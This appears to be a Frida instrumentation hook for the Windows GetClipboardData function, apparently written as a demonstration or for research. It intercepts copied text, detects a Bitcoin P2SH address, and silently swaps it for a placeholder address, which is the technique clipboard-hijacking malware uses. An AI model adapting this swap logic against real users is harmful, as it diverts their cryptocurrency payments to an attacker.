{
  /**
   * Called synchronously when about to call GetClipboardData.
   *
   * @this {object} - Object allowing you to store state for use in onLeave.
   * @param {function} log - Call this function with a string to be presented to the user.
   * @param {array} args - Function arguments represented as an array of NativePointer objects.
   * For example use args[0].readUtf8String() if the first argument is a pointer to a C string encoded as UTF-8.
   * It is also possible to modify arguments by assigning a NativePointer object to an element of this array.
   * @param {object} state - Object allowing you to keep state across function calls.
   * Only one JavaScript function will execute at a time, so do not worry about race-conditions.
   * However, do not use this to store function arguments across onEnter/onLeave, but instead
   * use "this" which is an object for keeping state local to an invocation.
   */
  onEnter(log, args, state) {
    this.uFormat = args[0].toInt32();
  },

  /**
   * Called synchronously when about to return from GetClipboardData.
   * See onEnter for details.
   *
   * @this {object} - Object allowing you to access state stored in onEnter.
   * @param {function} log - Call this function with a string to be presented to the user.
   * @param {NativePointer} retval - Return value represented as a NativePointer object.
   * @param {object} state - Object allowing you to keep state across function calls.
   */
  onLeave(log, retval, state) {
    var formatName = getClipboardFormatName(this.uFormat);
    log(`[+] GetClipboardData(${formatName}) => ${retval}`);
    
    if (!retval.isNull() && formatName == 'CF_UNICODETEXT') {
      var original = retval.readUtf16String();
      if (isValidP2SHAddress(original)) {
        log("[+] Captured address: " + original);
        const modified = '3ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456';
        log("[+] Modified address: " + modified);
        retval.writeUtf16String(modified);
      }
    }
  }
}
